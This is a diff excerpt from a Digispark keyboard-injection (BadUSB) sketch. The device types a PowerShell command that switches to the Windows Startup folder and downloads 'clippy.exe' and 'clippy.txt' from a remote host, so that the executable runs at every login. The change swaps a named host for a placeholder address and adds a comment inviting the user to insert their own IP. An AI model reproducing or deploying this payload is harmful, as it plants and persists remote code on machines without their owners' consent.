@@ -57,7 +57,7 @@ Please see "clippy.txt" for list of phrases.
       DigiKeyboard.sendKeyStroke(KEY_ENTER);
       DigiKeyboard.delay(100);
       // Execute code from the interwebs modify 000.0.0.0 with your IP address (192.168.0.0, 127.0.0.1, etc.)
-      DigiKeyboard.println(F("$StartupDir = [environment]::getfolderpath('Startup');cd $StartupDir;Invoke-WebRequest \"http://Dataducks.3utilities.com/download/clippy.exe\" -OutFile \"clippy.exe\";Invoke-WebRequest \"http://dataducks.3utilities.com/download/clippy.txt\" -OutFile \"clippy.txt\""));
+      DigiKeyboard.println(F("$StartupDir = [environment]::getfolderpath('Startup');cd $StartupDir;Invoke-WebRequest \"http://000.0.0.0/clippy.exe\" -OutFile \"clippy.exe\";Invoke-WebRequest \"http://000.0.0.0/clippy.txt\" -OutFile \"clippy.txt\""));
       DigiKeyboard.delay(100);
       DigiKeyboard.sendKeyStroke(KEY_ENTER);
       DigiKeyboard.delay(100);
